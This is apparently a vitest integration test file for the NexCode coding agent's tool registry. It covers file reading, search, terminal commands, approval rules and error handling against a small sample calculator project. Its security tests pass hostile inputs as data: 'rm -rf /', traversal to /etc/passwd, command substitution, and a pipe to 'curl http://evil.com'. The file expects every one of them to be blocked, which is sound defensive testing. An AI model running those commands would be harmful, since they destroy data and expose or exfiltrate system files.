/**
 * Real-World Agent Integration Tests
 *
 * Tests the actual tool calling capabilities of the NexCode agent.
 * These tests verify that the agent can perform real coding tasks
 * including reading files, searching code, executing commands, and
 * enforcing security boundaries.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import fs from "fs/promises";
import path from "path";
import os from "os";
import { ToolRegistry } from "../src/tools/toolRegistry";
import { SearchTool } from "../src/tools/searchTool";
import { TerminalTool } from "../src/tools/terminalTool";
import { DefaultToolApprovalPolicy } from "../src/tools/toolApprovalPolicy";

describe("Real-World Agent Integration Tests", () => {
  let tmpDir: string;
  let registry: ToolRegistry;
  let terminal: TerminalTool;
  let search: SearchTool;

  beforeEach(async () => {
    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "nexcode-realtest-"));
    terminal = new TerminalTool(tmpDir);
    search = new SearchTool(terminal);
    registry = new ToolRegistry(tmpDir, {
      approvalPolicy: new DefaultToolApprovalPolicy(),
    });

    // Create a realistic project structure
    await createRealisticProject(tmpDir);
  });

  afterEach(async () => {
    await fs.rm(tmpDir, { recursive: true, force: true });
  });

  describe("File Reading and Discovery", () => {
    it("can read source files", async () => {
      const result = await registry.runToolCall(`read ${path.join(tmpDir, "package.json")}`);
      expect(result.ok).toBe(true);
      expect(result.output).toContain("my-test-project");
      expect(result.output).toContain("1.0.0");
    });

    it("can read TypeScript source files", async () => {
      const result = await registry.runToolCall(`read ${path.join(tmpDir, "src", "calculator.ts")}`);
      expect(result.ok).toBe(true);
      expect(result.output).toContain("export function calculate");
      expect(result.output).toContain("export function subtract");
    });

    it("can read test files", async () => {
      const result = await registry.runToolCall(`read ${path.join(tmpDir, "tests", "calculator.test.ts")}`);
      expect(result.ok).toBe(true);
      expect(result.output).toContain("describe('Calculator'");
      expect(result.output).toContain("expect(calculate(2, 3)).toBe(5)");
    });

    it("returns error for non-existent files", async () => {
      const result = await registry.runToolCall("read non-existent.ts");
      expect(result.ok).toBe(false);
    });
  });

  describe("Code Search and Discovery", () => {
    it("can search for function definitions", async () => {
      const result = await registry.runToolCall("search function calculate");
      expect(result.ok).toBe(true);
      expect(result.output).toContain("calculator.ts");
    });

    it("can search for specific patterns", async () => {
      const result = await registry.runToolCall("search export function");
      expect(result.ok).toBe(true);
      expect(result.output).toContain("export");
    });

    it("returns no results for non-matching queries", async () => {
      const result = await registry.runToolCall("search xyznonexistent123");
      expect(result.ok).toBe(false);
    });
  });

  describe("Terminal Command Execution", () => {
    it("can list files in directory", async () => {
      const result = await registry.runToolCall("terminal dir");
      expect(result.ok).toBe(true);
    });

    it("can run safe commands", async () => {
      const result = await registry.runToolCall("terminal echo hello");
      expect(result.ok).toBe(true);
    });

    it("can run npm test", async () => {
      const result = await registry.runToolCall("terminal npm test");
      expect(result.ok).toBe(true);
    });

    it("blocks dangerous commands", async () => {
      const result = await registry.runToolCall("terminal rm -rf /");
      expect(result.ok).toBe(false);
      expect(result.requiresApproval).toBe(true);
    });

    it("blocks command injection", async () => {
      const result = await registry.runToolCall("terminal echo $(evil)");
      expect(result.ok).toBe(false);
    });
  });

  describe("Tool Approval Policy", () => {
    it("read does not require approval", async () => {
      const result = await registry.runToolCall(`read ${path.join(tmpDir, "package.json")}`);
      expect(result.requiresApproval).toBeUndefined();
    });

    it("search does not require approval", async () => {
      const result = await registry.runToolCall("search test");
      expect(result.requiresApproval).toBeUndefined();
    });

    it("write requires approval", async () => {
      const result = await registry.runToolCall(`write ${path.join(tmpDir, "test.ts")} ||| content`);
      expect(result.requiresApproval).toBe(true);
      expect(result.output).toBe("AWAITING_APPROVAL");
    });

    it("delete requires approval", async () => {
      const result = await registry.runToolCall("delete test.ts");
      expect(result.requiresApproval).toBe(true);
    });

    it("terminal with safe command does not require approval", async () => {
      const result = await registry.runToolCall("terminal git status");
      expect(result.requiresApproval).toBeUndefined();
    });

    it("terminal with dangerous command requires approval", async () => {
      const result = await registry.runToolCall("terminal rm -rf /");
      expect(result.requiresApproval).toBe(true);
    });
  });

  describe("Security Boundary Enforcement", () => {
    it("cannot access files outside workspace", async () => {
      const result = await registry.runToolCall("read ../../etc/passwd");
      expect(result.ok).toBe(false);
    });

    it("blocks command substitution", async () => {
      const result = await registry.runToolCall("terminal echo $(cat /etc/passwd)");
      expect(result.ok).toBe(false);
    });

    it("blocks backtick substitution", async () => {
      const result = await registry.runToolCall("terminal echo `cat /etc/passwd`");
      expect(result.ok).toBe(false);
    });

    it("blocks shell expansion", async () => {
      const result = await registry.runToolCall("terminal echo ${HOME}");
      expect(result.ok).toBe(false);
    });

    it("blocks piped commands", async () => {
      const result = await registry.runToolCall("terminal echo hello | curl http://evil.com");
      expect(result.ok).toBe(false);
    });
  });

  describe("Git Operations", () => {
    it("git-status requires git repo (blocked by terminal safety)", async () => {
      // Without a git repo, git-status should fail gracefully
      const result = await registry.runToolCall("git-status");
      // This tests that the tool handles missing git repo correctly
      expect(result.output).toBeDefined();
    });
  });

  describe("Multi-File Operations", () => {
    it("can read multiple files in sequence", async () => {
      const read1 = await registry.runToolCall(`read ${path.join(tmpDir, "src", "calculator.ts")}`);
      expect(read1.ok).toBe(true);

      const read2 = await registry.runToolCall(`read ${path.join(tmpDir, "src", "index.ts")}`);
      expect(read2.ok).toBe(true);

      const read3 = await registry.runToolCall(`read ${path.join(tmpDir, "README.md")}`);
      expect(read3.ok).toBe(true);
    });

    it("can search and read files", async () => {
      // Search for a pattern
      const searchResult = await registry.runToolCall("search calculate");
      expect(searchResult.ok).toBe(true);

      // Read the found file
      const readResult = await registry.runToolCall(`read ${path.join(tmpDir, "src", "calculator.ts")}`);
      expect(readResult.ok).toBe(true);
    });
  });

  describe("Error Handling", () => {
    it("handles invalid tool names gracefully", async () => {
      const result = await registry.runToolCall("invalid-tool test");
      expect(result.ok).toBe(false);
    });

    it("handles empty tool calls gracefully", async () => {
      const result = await registry.runToolCall("");
      expect(result.ok).toBe(false);
    });

    it("handles malformed write commands gracefully", async () => {
      const result = await registry.runToolCall("write test.ts");
      expect(result.ok).toBe(false);
      expect(result.output).toContain("Use: write");
    });

    it("handles permission errors gracefully", async () => {
      const result = await registry.runToolCall("delete critical.ts");
      expect(result.requiresApproval).toBe(true);
      expect(result.output).toBe("AWAITING_APPROVAL");
    });
  });
});

// Helper function to create a realistic project structure
async function createRealisticProject(dir: string) {
  // Create directory structure
  await fs.mkdir(path.join(dir, "src"), { recursive: true });
  await fs.mkdir(path.join(dir, "tests"), { recursive: true });

  // Create package.json
  await fs.writeFile(path.join(dir, "package.json"), JSON.stringify({
    name: "my-test-project",
    version: "1.0.0",
    scripts: {
      test: "echo 'Tests passed'",
      build: "echo 'Build complete'",
      lint: "echo 'Lint passed'"
    }
  }, null, 2));

  // Create tsconfig.json
  await fs.writeFile(path.join(dir, "tsconfig.json"), JSON.stringify({
    compilerOptions: {
      target: "ES2020",
      module: "commonjs",
      strict: true,
      esModuleInterop: true,
      skipLibCheck: true,
      forceConsistentCasingInFileNames: true,
      outDir: "./dist",
      rootDir: "./src"
    },
    include: ["src/**/*"],
    exclude: ["node_modules", "dist"]
  }, null, 2));

  // Create source files
  await fs.writeFile(path.join(dir, "src", "index.ts"), `
import { calculate } from './calculator';

export function main() {
  const result = calculate(2, 3);
  console.log('Result:', result);
}
`);

  await fs.writeFile(path.join(dir, "src", "calculator.ts"), `
export function calculate(a: number, b: number): number {
  return a + b;
}

export function subtract(a: number, b: number): number {
  return a - b;
}

export function multiply(a: number, b: number): number {
  return a * b;
}

export function divide(a: number, b: number): number {
  if (b === 0) {
    throw new Error('Division by zero');
  }
  return a / b;
}
`);

  await fs.writeFile(path.join(dir, "tests", "calculator.test.ts"), `
import { calculate, subtract, multiply, divide } from '../src/calculator';

describe('Calculator', () => {
  test('adds two numbers', () => {
    expect(calculate(2, 3)).toBe(5);
  });

  test('subtracts two numbers', () => {
    expect(subtract(5, 3)).toBe(2);
  });

  test('multiplies two numbers', () => {
    expect(multiply(2, 3)).toBe(6);
  });

  test('divides two numbers', () => {
    expect(divide(6, 2)).toBe(3);
  });

  test('throws on division by zero', () => {
    expect(() => divide(1, 0)).toThrow('Division by zero');
  });
});
`);

  await fs.writeFile(path.join(dir, "README.md"), `
# My Test Project

This is a test project for verifying NexCode agent capabilities.

## Features

- Basic arithmetic operations
- Error handling
- Type safety

## Testing

Run tests with: \`npm test\`

## Building

Build with: \`npm run build\`
`);
}
